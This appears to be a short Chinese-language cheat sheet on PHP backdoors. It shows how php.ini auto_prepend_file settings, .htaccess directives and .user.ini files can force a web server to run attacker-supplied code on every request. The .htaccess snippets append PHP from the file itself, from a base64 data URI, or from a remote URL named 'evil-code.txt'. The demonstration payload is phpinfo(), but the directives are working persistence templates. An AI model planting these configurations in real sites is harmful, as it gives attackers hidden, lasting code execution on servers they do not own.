后门
================================

php.ini构成的后门
---------------------------------
利用 auto_prepend_file 和 include_path

.htaccess后门
---------------------------------
::

    php_value auto_append_file .htaccess
    #<?php phpinfo();

::

    php_flag allow_url_include 1
    php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
    #php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
    #php_value auto_append_file https://sektioneins.de/evil-code.txt


.user.ini文件构成的PHP后门
---------------------------------
.user.ini可运行于所有以fastcgi运行的server。
利用方式同php.ini
